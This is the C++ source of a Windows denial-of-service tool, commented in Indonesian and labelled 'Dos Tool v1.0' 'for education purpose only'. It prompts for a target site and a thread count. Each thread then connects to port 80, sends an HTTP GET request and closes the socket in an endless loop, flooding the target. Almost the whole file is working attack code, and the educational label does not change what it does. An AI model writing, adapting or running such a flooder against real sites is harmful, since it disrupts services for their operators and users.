#include <cstdlib>
#include <iostream>
#include <winsock.h>
#include <windows.h>
#include "network1.h"

using namespace std;
// Prototype fungsi
DWORD WINAPI DoSThread(LPVOID Param);

// Deklarasi variabel global
unsigned int ThreadNum = 0;
char szBanner[] = "===================================\n"
                  "= Selamat Datang di Dos Tool v1.0 =\n"
                  "=                                 =\n"
                  "= by: Herry Gozali                =\n"
                  "= for education purpose only      =\n"
                  "===================================\n";
                  
int main(int argc, char *argv[])
{
    char szSiteBuf[128];
    char szNumberThread[64];
    int nResult;
    int nThread;
    SOCKADDR_IN addr;
    WSADATA wsaData;
    SOCKET sick;
    DWORD tid;
    
    cout << szBanner << endl;
    
    cout << "Masukan Situs Tujuan: ";
    cin.getline(szSiteBuf, sizeof(szSiteBuf)-1);
    
    cout << "Masukan Jumlah Thread: ";
    cin.getline(szNumberThread, sizeof(szNumberThread)-1);
    nThread = atoi(szNumberThread);
    
    nResult = InitWSA(&wsaData);
    
    if(nResult == 0)
        return 0;
    
    // Inforamasi server yang akan di DoS
    addr.sin_family = AF_INET;
    addr.sin_port = htons(80); // Port HTTP
    addr.sin_addr.s_addr = HostToByte(szSiteBuf);
    
    // Membuat thread sejumlah nThread
    for(int i=1; i <= nThread; i++)
        CreateThread(NULL, 0, &DoSThread, (LPVOID) &addr, 0, &tid); 
    
    // Tunda eksekusi agar thread sudah berhasil dibuat semua
    Sleep(1000);
    
    cout << endl << "Tekan Esc untuk mengakhiri...";
    
    // Looping untuk menghandle penekanan tombol Esc
    while(1)
    {
        // Jika Tombol Esc ditekan...
        if(GetAsyncKeyState(VK_ESCAPE) == -32767)
            ExitProcess(1);
    }
    
    return EXIT_SUCCESS;
}

DWORD WINAPI DoSThread(LPVOID Param)
{
    ThreadNum++;
    
    SOCKADDR_IN addr_copy;
    SOCKET sock;
    HANDLE hThread;
    
    // String untuk dikirim ke-server
    char Buffer[] = "GET / HTTP/1.1\r\n"
                    "Host: 127.0.0.1\r\n\r\n";
    
    cout << "Thread ke-" << ThreadNum << " running..." << endl;  
    
    // Mengatur prioritas thread 1 poin dibawah class priority
    hThread = GetCurrentThread(); // Ambil handle ke thread ini
    SetThreadPriority(hThread, THREAD_PRIORITY_BELOW_NORMAL);
                  
    if(Param == NULL)
    {
        cout << "Thread exit" << endl;
        return 0;
    }
    
    // Mengcopy nilai addr yang di pass-kan ke thread
    addr_copy = *(SOCKADDR_IN*) Param;
    
    // Infinite looping untuk proses DoS-ing
    while(1)
    {
        sock = Connect_Addr(&addr_copy);
        if(sock != 0)
        {
            send(sock, Buffer, strlen(Buffer), 0);
            Sleep(300);
            closesocket(sock);
        }
        else if(sock == INVALID_SOCKET)
        {
            ExitProcess(1);
        }
    }
    
    return 0;
}
    
    
    

